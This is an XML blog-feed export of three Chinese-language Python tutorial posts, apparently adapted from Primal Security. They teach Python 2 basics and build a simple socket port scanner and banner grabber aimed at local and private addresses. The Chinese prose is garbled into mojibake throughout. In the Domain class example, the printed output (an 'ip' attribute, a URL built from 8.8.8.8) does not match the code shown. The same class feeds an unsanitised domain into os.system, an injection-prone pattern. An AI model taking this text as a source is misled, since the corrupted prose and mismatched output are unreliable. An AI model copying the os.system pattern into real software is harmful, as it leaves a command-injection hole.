Áé∞Âú®Â∞±‰∏ç‰ºöÂá∫Áé∞ÈîôËØØ‰∫ÜÔºå‰∏ÄË°åÂæàÁÆÄÂçïÁöÑ‰ª£Á†ÅÂ∞±ËÆ©‰Ω†ÁöÑÁ®ãÂ∫èËÉΩÂ§üÁªßÁª≠Â∑•‰Ωú‰∏ãÂéª^_^„ÄÇÁé∞Âú®ËÆ©Êàë‰ª¨‰ΩøÁî®‰πãÂâçÂ≠¶Âà∞ÁöÑÁü•ËØÜÔºå‰ΩøÁî®forÂæ™ÁéØÊù•ÂÜô‰∏Ä‰∏™ÁÆÄÂçïÁöÑÁ´ØÂè£Êâ´ÊèèÂô®: 1234567891011121314151617181920&gt;&gt;&gt;&gt;&gt;&gt; for port in range(20,25):... try:... print "[+] Attempting to connect to 127.0.0.1:"+str(port)... s.connect(('127.0.0.1', port))... s.send('Primal Security \n') ... banner = s.recv(1024)... if banner:... print "[+] Port "+str(port)+" open: "+banner... s.close()... except: pass...17[+] Attempting to connect to 127.0.0.1:20[+] Attempting to connect to 127.0.0.1:21[+] Attempting to connect to 127.0.0.1:22[+] Port 22 open: OpenSSH[+] Attempting to connect to 127.0.0.1:23[+] Attempting to connect to 127.0.0.1:24[+] Attempting to connect to 127.0.0.1:25 ‰∏äÈù¢Êàë‰ª¨ÊºîÁ§∫‰∫Ü‰ΩøÁî®try/exceptÂæ™ÁéØÊù•Â§ÑÁêÜÂΩìsocketËøûÊé•ÁöÑÊó∂ÂÄôÈÅáÂà∞Á´ØÂè£ÂÖ≥Èó≠ÁöÑÈîôËØØÔºåÂêåÊó∂‰∏äÈù¢ËøòÊºîÁ§∫‰∫ÜÂ¶Ç‰Ωï‰ΩøÁî®‚Äùif‚ÄùËØ≠Âè•ÊâìÂç∞Âá∫ÂèØ‰ª•ËøûÊé•ÊàêÂäüÁöÑÁ´ØÂè£„ÄÇ‰∏ãÈù¢Êàë‰ª¨Â∞ÜÂàõÂª∫‰∏Ä‰∏™Êàë‰ª¨Êâ´ÊèèÊåáÂÆöÁ´ØÂè£ÁöÑÊâ´ÊèèÂô®ÔºåËøôÈáåÁöÑÁ´ØÂè£Âè∑ÔºåÊàë‰ª¨‰ΩøÁî®Êï∞ÁªÑÊù•Â≠òÂÇ®ÔºåÁÑ∂ÂêéÈÅçÂéÜËøô‰∏Ä‰∏™Êï∞ÁªÑ: 1234567891011&gt;&gt;&gt;&gt;&gt;&gt; ports = [22, 445, 80, 443, 3389]&gt;&gt;&gt; for port in ports:... print port...22445804433389&gt;&gt;&gt; Â¶ÇÊûúÊàë‰ª¨ÊÉ≥‰∏ÄÊ¨°ÊÄßÊâ´ÊèèÂ§öÂè∞‰∏ªÊú∫ÔºåÂèØ‰ª•‰ΩøÁî®‰∏Ä‰∏™forÂæ™ÁéØÂµåÂ•ó„ÄÇÊúÄÂ§ñÂ±ÇÁöÑÊòØ‰∏ªÊú∫ÁöÑipÔºåÁÑ∂ÂêéÈáåÈù¢ÁöÑforÂæ™ÁéØÊòØÁ´ØÂè£„ÄÇ‰∏ãÈù¢Êúâ‰∏Ä‰∏™Âü∫Á°ÄÁöÑ‰æãÂ≠êÔºåÂ±ïÁ§∫‰∫ÜÂ¶Ç‰ΩïÈÄöËøáÂæ™ÁéØÂµåÂ•óÊù•ÊûÑÂª∫‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊâ´ÊèèÂô®: 123456789101112131415161718192021222324252627282930313233&gt;&gt;&gt;&gt;&gt;&gt; hosts = ['127.0.0.1', '192.168.1.5', '10.0.0.1']&gt;&gt;&gt;&gt;&gt;&gt; ports = [22, 445, 80, 443, 3389]&gt;&gt;&gt;&gt;&gt;&gt; for host in hosts:... for port in ports:... try:... print "[+] Connecting to "+host+":"+str(port)... s.connect((host, port))... s.send('Primal Security \n')... banner = s.recv(1024)... if banner:... print "[+] Port "+str(port)+" open: "+banner... s.close()... except:pass...[+] Connecting to 127.0.0.1:22[+] Port 22 open: OpenSSH[+] Connecting to 127.0.0.1:445[+] Connecting to 127.0.0.1:80[+] Connecting to 127.0.0.1:443[+] Connecting to 127.0.0.1:3389[+] Connecting to 192.168.1.5:22[+] Connecting to 192.168.1.5:445[+] Connecting to 192.168.1.5:80[+] Connecting to 192.168.1.5:443[+] Connecting to 192.168.1.5:3389[+] Connecting to 10.0.0.1:22[+] Connecting to 10.0.0.1:445[+] Connecting to 10.0.0.1:80[+] Connecting to 10.0.0.1:443[+] Connecting to 10.0.0.1:3389 Ê≠£Â¶Ç‰Ω†ÊâÄÁúãÂà∞ÁöÑÁªìÊûúÔºåÂÆÉÊäähostsÊï∞ÁªÑÈáåÈù¢ÁöÑÊâÄÊúâÂÄºÈÉΩÈÅçÂéÜ‰∫Ü‰∏ÄÊ¨°portsÊï∞ÁªÑÔºåÁ≠âhosts[0]Êâ´ÊèèÂÆåÊàê‰πãÂêéÂÜçÊâ´Êèèhosts[1]‰æùÊ¨°Á±ªÊé®„ÄÇÂú®Ëøô‰∏™‰æãÂ≠êÈáåÈù¢‰Ω†‰πüÂèØ‰ª•‰øÆÊîπÈáåÈù¢ÁöÑ‰ª£Á†ÅÔºåÂè™ËÆ©ÂÆÉÊòæÁ§∫Âá∫ÂèØ‰ª•ÊâìÂºÄÁöÑÁ´ØÂè£„ÄÇ Âú®ËøôÊúÄÂêéÔºå‰Ω†‰ºöÂèëÁé∞ËøòÊòØNmapÊúÄÂ•ΩÁî®Ôºå‰ΩÜÊòØÊàë‰ª¨Â∞ÜÂú®ÂêéÈù¢ÁöÑÊñáÁ´†ÈáåÈù¢ÁªßÁª≠ÂÆåÂñÑËøô‰∏™ÂÆû‰æãÔºåÂ§ßÂÆ∂ÂèØ‰ª•Ëä±ÁÇπÊó∂Èó¥ÂéªÂ≠¶‰π†‰∏Ä‰∫õsocketÊ®°ÂùóÂÖ∂‰ªñÁöÑÂäüËÉΩÂáΩÊï∞ÔºåÂ§ßÂÆ∂ÂèØ‰ª•‰ΩøÁî®dir(socket)Êù•‰∫ÜËß£Êõ¥Â§öÔºåÂΩìÁÑ∂ËøòÊúâhelp().‰∏ã‰∏ÄÁ´†]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PythonÈªëÂÆ¢‰πãÊóÖ0x1]]></title>
    <url>%2F2015%2F10%2F13%2Fpythonhacker_0x1%2F</url>
    <content type="text"><![CDATA[ÂÖ•Èó®(2)Ëøô‰∏ÄÁ´†Â∞ÜÁªßÁª≠ËÆ≤Ëß£‰∏Ä‰∫õÂü∫Á°ÄÁöÑPythonËÑöÊú¨Ê¶ÇÂøµ,Êàë‰ª¨Â∞ÜÊää‰ª£Á†ÅÂÜôÂÖ•Âà∞‰∏Ä‰∏™ËÑöÊú¨ÈáåÈù¢ÔºåÂáΩÊï∞ÔºåÁ±ªÂíåsysÊ®°Âùó„ÄÇ PythonËÑöÊú¨Ê°ÜÊû∂‰∏ãÈù¢ÊòØ‰∏Ä‰∏™ÂºÄÂßãÂÜôPythonËÑöÊú¨ÁöÑÂü∫Á°Ä‰æãÂ≠êÔºåÂºÄÂßãÈÉ®ÂàÜÔºåÊàë‰πàÂëäËØâÁ≥ªÁªüÈúÄË¶Å‰ΩøÁî®ÈÇ£‰∏Ä‰∏™Ëß£ÈáäÂô®‚Äù#!/usr/bin/env python‚Äù,ÁÑ∂ÂêéÊàë‰ª¨ÈÄöËøá‚Äùdef main():‚ÄùÂ£∞Êòé‰∏Ä‰∏™mainÂáΩÊï∞,ÊúÄÂêé2Ë°å‰ª£Á†ÅÊúâmian()ÁöÑÂÖàÊâßË°å„ÄÇ‰Ω†ÂèØ‰ª•ÂÆö‰πâÂú®‰Ω†ÁöÑËÑöÊú¨ÈáåÈù¢ÂÆö‰πâÂÖ∂ÂÆÉÂáΩÊï∞ÔºåËøôÊ†∑‰ΩøÂæó‰Ω†ÁöÑ‰ª£Á†ÅÊõ¥ÂÆπÊòìÁöÑÁêÜËß£Âíå‰øÆÊîπÁª¥Êä§Ôºö 12345678910#!/usr/bin/pythonimport &lt;module1&gt;, &lt;module2&gt; def myFunction(): def main(): myFunction() if __name__=="__main__": main() ÂáΩÊï∞ ‰∏ÄÁßçÂ∏∏ËßÅÁöÑÂÜôÊ≥ïÊòØÊääÊØè‰∏™ÂäüËÉΩÂáΩÊï∞ÂàÜÂºÄÂÜôÔºåÊâßË°å‰∏Ä‰∫õÊìç‰Ωú‰πãÂêéÁÑ∂ÂêéËøîÂõûÁªìÊûú„ÄÇ‰∏ãÈù¢ÁöÑËøô‰∏™‰º™‰ª£Á†ÅÊºîÁ§∫ÁöÑ‰æãÂ≠êÂ∞±ËÉΩÂ§üÂæàÊ∏ÖÊô∞ÁöÑËß£ÈáäËøô‰∏™Ê¶ÇÂøµ: 12345678# Â£∞ÊòéÂáΩÊï∞/ÈÄªËæëÂ§ÑÁêÜdef MyFunction: ...do work... return output #Âú®mainÂáΩÊï∞ÈáåÈù¢Ë∞ÉÁî®:def main(): output = MyFunction(input) Á±ªPythonÁ±ªÂºÄÂßã‰ΩøÁî®ÁöÑÊó∂ÂÄô‰ºöÊúâÁÇπÂõ∞ÈöæÔºåÂõ†‰∏∫ÂÆÉÊòØÊïô‰Ω†‰ª•‰ΩïÁßçÊñπÂºèËÆæËÆ°‰Ω†ÁöÑ‰ª£Á†ÅÔºåÂ¶ÇÊûú‰Ω†ÊéåÊè°Á±ªÁöÑÊ¶ÇÂøµÈÇ£‰πà‰Ω†Â∞±ÂèØ‰ª•ÊääÊï∞ÊçÆÂíåÂÆö‰πâÊåâÁÖßÁ±ªÁöÑÈÄªËæëÂàÜÁªÑÔºåËøôÊ†∑Á±ªÂ∞±Êã•Êúâ‰∫ÜÂ±ûÊÄßÂíå‰∏é‰πãÊÉ≥ÂÖ≥ËÅîÁöÑÊñπÊ≥ï„ÄÇÂΩì‰Ω†ÂÆö‰πâ‰∏Ä‰∏™Á±ª‰πãÂêéÔºå‰Ω†ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªÔºåÁÑ∂ÂêéÁªßÊâø‰πãÂâçÂàõÂª∫ÁöÑÁ±ªÁöÑÂ±ûÊÄßÂíå‰∏é‰πãÁõ∏ÂÖ≥ËÅîÁöÑÊñπÊ≥ïÔºåËøôÁºñÁ®ãÂ∞±Âè´ÂÅöÈù¢ÂêëÂØπË±°ÁºñÁ®ã„ÄÇ Â¶ÇÊûú‰Ω†ÊÑüÂà∞Ëø∑ÊÉëÔºåÈÇ£‰πàÊàëÂª∫ËÆÆ‰Ω†ÂÖà‰∏çË¶ÅÂéªÂ≠¶‰π†Á±ªÔºåÂÆûÈôÖ‰∏äÔºå‰Ω†Âπ∂‰∏çÈúÄË¶ÅÁ±ª„ÄÇ‰ΩÜÂÆÉÂèØ‰ª•ËÆ©‰Ω†ÁöÑ‰ª£Á†ÅÂáèÂ∞ëÂÜó‰Ωô„ÄÇ‰∏ãÈù¢Êàë‰ª¨Â∞ÜÂÆö‰πâ‰∏™Êñ∞ÁöÑÁ±ª‚ÄùDomain‚Äù‰ΩøÁî®‚Äùclass‚ÄùÂÖ≥ÈîÆÂ≠óÔºåÂΩì‰Ω†ÂÆû‰æãÂåñDomainÁ±ªÂûãÂØπË±°ÁöÑÊó∂ÂÄôÔºåÂÆÉÁöÑÁ±ªÂûãÊúâÂ§öÁßçÊñπÂºèÂéªÂÆö‰πâ: 1234567891011121314151617181920212223242526272829303132333435&gt;&gt;&gt; import os&gt;&gt;&gt; class Domain:... def __init__(self, domain, port, protocol):#ÈÄöËøá‰∏§‰∏™ÂÜÖÈÉ®ÂèòÈáèÂ≠òÂÇ®ÂèòÈáè... self.domain=domain... self.port=port... self.protocol=protocol#ÊûÑÈÄ†‰∏Ä‰∏™urlÁöÑÊñπÊ≥ï... def URL(self):... if self.protocol == 'https':... URL = 'https://'+self.domain+':'+self.port+'/'... if self.protocol == 'http':... URL = 'http://'+self.domain+':'+self.port+'/'... return URL# Ë∞ÉÁî®os.system‰∏≠‰∏ªÊú∫ÂëΩ‰ª§lookupÂéªËß£ÊûêÂüüÂêç... def lookup(self):... os.system("host "+self.domain)...&gt;&gt;&gt;&gt;&gt;&gt; domain=Domain('google.com', '443', 'https')&gt;&gt;&gt;&gt;&gt;&gt; dir(domain)['URL', '__doc__', '__init__', '__module__', 'ip', 'lookup', 'port', 'protocol']&gt;&gt;&gt; domain.URL()'https://8.8.8.8:443/'&gt;&gt;&gt; domain.ip'8.8.8.8'&gt;&gt;&gt; domain.port'443'&gt;&gt;&gt; domain.protocol'https'&gt;&gt;&gt; domain.lookup()google.com has address 74.125.228.233google.com has address 74.125.228.227google.com has address 74.125.228.232 Ê≠£Â¶Ç‰Ω†ÊâÄÁúãÂà∞ÁöÑÔºåÂΩì‰Ω†ÂÆû‰æãÂåñ‰∏Ä‰∏™DomianÁ±ª‰πãÂêé‰Ω†ÂèØ‰ª•ËøêË°åÁ±ª‰∏≠ÁöÑÊñπÊ≥ï„ÄÇÂÜçÊ¨°ËØ¥Â£∞ÔºåËøô‰∏™Ê¶ÇÂøµÊúÄÂàùÁöÑÊó∂ÂÄôÂæàÂÆπÊòìÊ∑∑‰π±ÔºåÂ∞§ÂÖ∂ÊòØÂΩì‰Ω†ÂàöÂàöPythonÂíåÁºñÁ®ãÁöÑÊó∂ÂÄô„ÄÇÂ∞ùËØï‰∏Ä‰∏ãÂéªÂÆûÁé∞‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªÂú®‰Ω†ÁöÑPythonËÑöÊú¨ÈáåÈù¢ÔºåÊàëÂèëÁé∞ËøôÊòØÊéåÊè°Ëøô‰∏™Ê¶ÇÂøµÊúÄÂ•ΩÁöÑÈÄîÂæÑ„ÄÇ ‰ΩøÁî®sysÂ§ÑÁêÜÂëΩ‰ª§Ë°åËæìÂÖ•ÂÄºÊúÄÂ•ΩÊàë‰ª¨Êù•‰ªãÁªç‰∏Ä‰∏ãsysÊ®°ÂùóÔºåÂÆÉÂèØ‰ª•ËÆ©‰Ω†ËØªÂèñ‰ªéÂëΩ‰ª§ÁªàÁ´ØËæìÂÖ•ÁöÑÂÄºÂπ∂‰∏îÂ∏Æ‰Ω†ÂºïÂÖ•Âà∞ËÑöÊú¨ÈáåÈù¢ÔºåÂÆÉÁöÑËØ≠Ê≥ïÂæàÁÆÄÂçïÔºåsys.agrv[0]Â∞±ÊòØ‰∏Ä‰∏™ÂÆûÈôÖÁöÑËÑöÊú¨ÂêçÔºåÂπ∂Âú®ÂëΩ‰ª§Ë°åÊåáÂÆöÁöÑÊØè‰∏™ÂèÇÊï∞ÂêéÈù¢ÂàÜÈÖç‰∏Ä‰∏™‰∏ãÊ†á„ÄÇ‰∏ãÈù¢ÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑ‰æãÂ≠ê: 123456789#!/usr/bin/pythonimport sysscript = sys.argv[0]ip = sys.argv[1]port = sys.argv[2]print "[+] The script name is: "+scriptprint "[+] The IP is: "+ip+" and the port is: "+port ÂΩìÊâßË°åËøô‰∏™ËÑöÊú¨ÁöÑÊó∂ÂÄôÔºåÂπ∂‰∏îÂêéÈù¢Ë∑ü‰∏â‰∏™ÂèÇÊï∞ÊâßË°å‰πãÂêéÁöÑÁªìÊûúÂ¶Ç‰∏ã: 123~$ python sys.py 8.8.8.8 53[+] The script name is: sys.py[+] The IP is: 8.8.8.8 and the port is: 53 ‰∏äÈù¢ÁöÑÂè™ÊòØ‰∏Ä‰∏™‰æãÂ≠êÔºåÂ§ßÂÆ∂ÂèØ‰ª•ÁªßÁª≠ÂéªÁ†îÁ©∂ÂÖ∂ÂÆÉPythonÊ®°ÂùóÔºåÂõ†‰∏∫ÂÆÉ‰ª¨ËÉΩÂ§üÊîæ‰Ω†Áî®ÊúÄÁÆÄÂçïÁöÑÊñπÂºèËß£ÂÜ≥‰Ω†ÈÅáÂà∞ÁöÑÈóÆÈ¢ò„ÄÇ‰∏ã‰∏ÄÁ´†Â∞Ü‰ºö‰ªãÁªç‰ΩøÁî®PythonËøõË°åÁΩëÁªúËøûÊé•Âπ∂‰∏îÂÜôÂá∫‰∏Ä‰∏™Âü∫Á°ÄÁöÑÊâ´ÊèèÂô®.]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PythonÈªëÂÆ¢‰πãÊóÖ0x0]]></title>
    <url>%2F2015%2F10%2F12%2Fpythonhacker_0x0%2F</url>
    <content type="text"><![CDATA[ÂÖ•Èó® ËøôÂ∞ÜÊòØÁ¨¨‰∏Ä‰∏™‰∏ÄÁ≥ªÂàóÂÖ≥‰∫épythonÁºñÁ®ãÁöÑÂçöÂÆ¢ÊñáÁ´†„ÄÇpythonÊòØ‰∏ÄÈó®ÈùûÂ∏∏Âº∫Â§ßÁöÑËØ≠Ë®ÄÔºåÂõ†‰∏∫ÂÆÉÊúâ‰ø°ÊÅØÂÆâÂÖ®Á§æÂå∫ÁöÑÊîØÊíë„ÄÇËøôÊÑèÂë≥ÁùÄÂæàÂ§öÂ∑•ÂÖ∑ÈÉΩÊòØÁî±pythonÁºñÂÜôÂπ∂‰∏îÂèØ‰ª•Âú®ËÑöÊú¨‰∏≠Ë∞ÉÁî®ÂæàÂ§öÊ®°Âùó„ÄÇ‰ΩøÁî®Ê®°ÂùóÁöÑÂ•ΩÂ§ÑÂ∞±ÊòØÂè™ÈúÄË¶ÅÂ∞ëÈáèÁöÑ‰ª£Á†ÅÂ∞±ËÉΩÂ§üÂÆåÊàêÊâÄÈúÄÁöÑ‰ªªÂä°„ÄÇ ËøôÁØáÊñáÁ´†ÂÅáÂÆö‰Ω†ÁöÑÁ≥ªÁªüÊòØLinuxÔºåpythonÁâàÊú¨ÊòØ2.*„ÄÇÂú®ÂÜô‰ª£Á†ÅÁöÑÊó∂ÂÄô‰Ω†‰πüÂèØ‰ª•Áõ¥Êé•ÁöÑÂÜôÂú®Ëß£ÈáäÂô®ÈáåÈù¢(linuxÈáåÈù¢ËæìÂÖ•pythonÂç≥ÂèØËøõÂÖ•)Ôºå‰πüÂèØ‰ª•Êää‰ª£Á†ÅÊîæÂà∞‰∏Ä‰∏™Êñá‰ª∂ÈáåÈù¢„ÄÇÂæàÂ§ö‰∫∫‰ºöÂèëÁé∞Êää‰ª£Á†ÅÂ≠òÊîæÂà∞Êñá‰ª∂ÈáåÈù¢Ë¶ÅÊØîÁõ¥Êé•ÂÜôÂú®Ëß£ÈáäÂô®‰∏äÈù¢Ë¶ÅÂ•ΩÂæàÂ§ö„ÄÇÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØpython ‰∏≠Âº∫Âà∂Áº©Ëøõ„ÄÇÂ§ßÂÆ∂Âú®ÂÜôÂáΩÊï∞Â£∞ÊòéÔºåÂæ™ÁéØÔºåif/elseËØ≠Âè•Á≠âÁ≠âÁöÑÊó∂ÂÄôÂ∞±‰ºöÂèëÁé∞„ÄÇ pythonËß£ÈáäÂô®Âú®ÁªàÁ´ØÈáåÈù¢ËæìÂÖ•python: 12345~$ pythonPython 2.7.6 (default, Mar 22 2014, 22:59:56) [GCC 4.8.2] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; ËæìÂÖ•‰πãÂêé‰Ω†Â∞±ÂèØ‰ª•Áõ¥Êé•Âú®Ëß£ÈáäÂô®ÈáåÈù¢ÂÜô‰Ω†ÁöÑ‰ª£Á†Å‰∫Ü„ÄÇ‰∏ãÈù¢Êàë‰ª¨Â∞ÜÂ£∞Êòé‰∏§‰∏™ÂèòÈáèÔºåÂπ∂‰∏î‰ΩøÁî®type()ÂáΩÊï∞Êü•ÁúãÂèòÈáèÁöÑÁ±ªÂûã„ÄÇÂÅáËÆæÊàë‰ª¨Â£∞Êòé‰∫Ü‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂíåÊï¥ÂûãÔºö 12345678910&gt;&gt;&gt;&gt;&gt;&gt; ip = '8.8.8.8'&gt;&gt;&gt; port = 53&gt;&gt;&gt;&gt;&gt;&gt; type(ip)&lt;type 'str'&gt;&gt;&gt;&gt;&gt;&gt;&gt; type(port)&lt;type 'int'&gt;&gt;&gt;&gt; ‰Ω†ÂèØ‰ª•‰ΩøÁî®ÂÜÖÁΩÆÁöÑhelp()ÂáΩÊï∞Âéª‰∫ÜËß£‰∏Ä‰∏™ÂáΩÊï∞ÁöÑËØ¶ÁªÜ„ÄÇËÆ∞‰ΩèËøô‰∏ÄÁÇπÔºåÂÆÉÂèØ‰ª•Â∏ÆÂä©‰Ω†Âú®Â≠¶‰π†ËØ≠Ë®ÄÁöÑÊó∂ÂÄôÂ≠¶‰π†Âà∞Êõ¥Â§öÁöÑËØ¶ÁªÜÂÜÖÂÆπ. 123&gt;&gt;&gt;&gt;&gt;&gt; help(type)&gt;&gt;&gt; ÊúâÊó∂‰Ω†‰ºöÊÉ≥Êää‰∏Ä‰∫õÂèòÈáèÂíåÂ≠óÁ¨¶‰∏≤ËøûÊé•Ëµ∑Êù•ÁÑ∂ÂêéÈÄöËøáËÑöÊú¨ÊòæÁ§∫Âá∫Êù•„ÄÇÈÇ£‰πà‰Ω†Â∞±ÈúÄË¶Å‰ΩøÁî®str()ÂáΩÊï∞ÊääÊï¥ÂûãËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤Á±ªÂûã 1234&gt;&gt;&gt; ip='1.1.1.1'&gt;&gt;&gt; port=55&gt;&gt;&gt; print 'the ip is:'+ip+'and the port is:'+str(port)the ip is:1.1.1.1and the port is:55 ÂâçÈù¢Â£∞ÊòéÂèòÈáèÁöÑÊó∂ÂÄô‚ÄùIP‚ÄùÂ∞±ÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Â∞±‰∏çÈúÄË¶ÅËΩ¨Êç¢ÔºåËÄå‚Äùport‚ÄùÂ∞±ÈúÄË¶Å„ÄÇÁé∞Âú®‰Ω†Â∞±Â∑≤ÁªèÁü•ÈÅì‰∫Ü‰∏§‰∏™Âü∫Êú¨ÁöÑÊï∞ÊçÆÁ±ªÂûã(stringÂíåinteger)„ÄÇÁé∞Âú®‰Ω†ÂèØ‰ª•ËØïËØï‰ΩøÁî®ÂÜÖÁΩÆÂáΩÊï∞‰∏éËøô‰∏§‰∏™Êï∞ÊçÆÁ±ªÂûãÂÜôÂá∫ÂÖ∂‰ªñÁöÑ‰ª£Á†Å„ÄÇ PythonÂ≠óÁ¨¶‰∏≤ÂÖÅËÆ∏‰Ω†ÈÄöËøáÂÅèÁßªÂÄºÊù•Ëé∑Âèñ‰Ω†ÊÉ≥ÈúÄË¶ÅÁöÑÂ≠óÁ¨¶‰∏≤,Âπ∂‰∏îÂèØ‰ª•ÈÄöËøálen()ÂáΩÊï∞Êù•Ëé∑ÂèñÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶ÔºåÂÆÉÂèØ‰ª•Â∏ÆÂä©‰Ω†Êõ¥Êñπ‰æøÁöÑÊìç‰ΩúÂ≠óÁ¨¶‰∏≤„ÄÇ 12345678910111213&gt;&gt;&gt;&gt;&gt;&gt; domain='primalsecurity.net'&gt;&gt;&gt; domain'primalsecurity.net'&gt;&gt;&gt; domain[0]'p'&gt;&gt;&gt; domain[0:3]'pri'&gt;&gt;&gt; domain[1:]'rimalsecurity.net' &gt;&gt;&gt; len(domain)18 ‰Ω†ÂèØ‰ª•‰ΩøÁî®ÂÜÖÂª∫ÁöÑdir()ÂáΩÊï∞Êù•ÂàóÂá∫Ê®°ÂùóÂÆö‰πâÁöÑÊ†áËØÜÁ¨¶„ÄÇÊ†áËØÜÁ¨¶ÊúâÂáΩÊï∞„ÄÅÁ±ªÂíåÂèòÈáè„ÄÇ 12&gt;&gt;&gt; dir(ip)['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_formatter_field_name_split', '_formatter_parser', 'capitalize', 'center', 'count', 'decode', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'index', 'isalnum', 'isalpha', 'isdigit', 'islower', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill'] Áé∞Âú®‰Ω†ÂèØ‰ª•‰ΩøÁî®‰∏äÈù¢Âàó‰∏æÂá∫Êù•ÁöÑÂÜÖÂª∫Â≠óÁ¨¶‰∏≤ÂáΩÊï∞ÔºåÂ¶ÇÊûúÊÉ≥Áü•ÈÅìËøô‰∏™ÂáΩÊï∞ÁöÑÊõ¥Â§öÊèèËø∞ÂèØ‰ª•ÂèÇËÄÉÂâçÈù¢ÊèêÂà∞ÁöÑhelp()ÂáΩÊï∞: 123456789&gt;&gt;&gt;&gt;&gt;&gt; help(ip.split)&gt;&gt;&gt;&gt;&gt;&gt; string = ip+':'+str(port)&gt;&gt;&gt; string'8.8.8.8:53'&gt;&gt;&gt;&gt;&gt;&gt; string.split(':')['8.8.8.8', '53'] ËøôsplitÂáΩÊï∞Êää‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÈÄöËøá‚Äù:‚ÄùÂàáÂâ≤ÁîüÊàê‰∏Ä‰∏™Êñ∞ÁöÑÂàóË°®„ÄÇËøôÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÊúâÁî®ÁöÑÂ≠óÁ¨¶‰∏≤ÂáΩÊï∞Âõ†‰∏∫‰Ω†ËÉΩÂ§üÊääËøô‰∏™Â≠óÁ¨¶‰∏≤ÈáåÈù¢ÁöÑÊúâÁî®‰ø°ÊÅØÊèêÂá∫Âá∫Êù•„ÄÇ‰æãÂ¶ÇÔºå‰Ω†Ëé∑ÂèñÂà∞‰∫Ü‰∏Ä‰∏™ipÂàóË°®Ôºå‰Ω†ÊÉ≥Âú®Ëøô‰∏™ÂàóË°®ÈáåÈù¢Ê∑ªÂä†‰∏Ä‰∏™Á¥¢ÂºïÂÄº„ÄÇ‰Ω†‰πüÂèØ‰ª•Âà†Èô§ÂíåÊ∑ªÂä†Êñ∞ÁöÑÂÄºÂà∞Ëøô‰∏™ÂàóË°®ÈáåÈù¢ÈÄöËøá.append()Âíå.remove()ÂáΩÊï∞ 12345678910111213141516&gt;&gt;&gt;&gt;&gt;&gt; list = string.split(':')&gt;&gt;&gt;&gt;&gt;&gt; list['8.8.8.8', '53']&gt;&gt;&gt;&gt;&gt;&gt; list[0]'8.8.8.8'&gt;&gt;&gt;&gt;&gt;&gt; list.append('google')&gt;&gt;&gt; list['8.8.8.8', '53', 'google']&gt;&gt;&gt; list.remove('google')&gt;&gt;&gt; list['8.8.8.8', '53']&gt;&gt;&gt; PythonÊ®°ÂùóÂú®‰∏äÈù¢ÊèêÂà∞ËøáÔºåPythonÊ®°ÂùóËÉΩÂ§üËÆ©‰Ω†Áî®Â∞ëÈáèÁöÑ‰ª£Á†ÅÂ∞±ËÉΩÂ§üÂÆåÊàê‰Ω†ÁöÑ‰ªªÂä°,PythonÊúâËÆ∏Â§öÊúâÁî®ÁöÑÂÜÖÂª∫Ê®°Âùó(os,subprocess,socket,urllib,httplib,re,sysÁ≠âÁ≠â)ÂíåÁ¨¨‰∏âÊñπÊ®°Âùó(cymruwhois,scapy,dpkt,spiderÁ≠âÁ≠â).‰ΩøÁî®PythonÊ®°ÂùóÂæàÁÆÄÂçï‚Äùimport ‚Äú. OSÊ®°ÂùóÊòØÈùûÂ∏∏ÈáçË¶ÅÁöÑÂõ†‰∏∫‰Ω†ÈúÄË¶ÅÂú®‰Ω†ÁöÑPython‰ª£Á†ÅÈáåÈù¢Ë∞ÉÁî®Á≥ªÁªüÂëΩ‰ª§: 123456&gt;&gt;&gt;&gt;&gt;&gt; import os&gt;&gt;&gt;&gt;&gt;&gt; dir(os)['EX_CANTCREAT', 'EX_CONFIG', 'EX_DATAERR', 'EX_IOERR', 'EX_NOHOST', 'EX_NOINPUT', 'EX_NOPERM', 'EX_NOUSER', 'EX_OK', 'EX_OSERR', 'EX_OSFILE', 'EX_PROTOCOL', 'EX_SOFTWARE', 'EX_TEMPFAIL', 'EX_UNAVAILABLE', 'EX_USAGE', 'F_OK', 'NGROUPS_MAX', 'O_APPEND', 'O_ASYNC', 'O_CREAT', 'O_DIRECT', 'O_DIRECTORY', 'O_DSYNC', 'O_EXCL', 'O_LARGEFILE', 'O_NDELAY', 'O_NOATIME', 'O_NOCTTY', 'O_NOFOLLOW', 'O_NONBLOCK', 'O_RDONLY', 'O_RDWR', 'O_RSYNC', 'O_SYNC', 'O_TRUNC', 'O_WRONLY', 'P_NOWAIT', 'P_NOWAITO', 'P_WAIT', 'R_OK', 'SEEK_CUR', 'SEEK_END', 'SEEK_SET', 'ST_APPEND', 'ST_MANDLOCK', 'ST_NOATIME', 'ST_NODEV', 'ST_NODIRATIME', 'ST_NOEXEC', 'ST_NOSUID', 'ST_RDONLY', 'ST_RELATIME', 'ST_SYNCHRONOUS', 'ST_WRITE', 'TMP_MAX', 'UserDict', 'WCONTINUED', 'WCOREDUMP', 'WEXITSTATUS', 'WIFCONTINUED', 'WIFEXITED', 'WIFSIGNALED', 'WIFSTOPPED', 'WNOHANG', 'WSTOPSIG', 'WTERMSIG', 'WUNTRACED', 'W_OK', 'X_OK', '_Environ', '__all__', 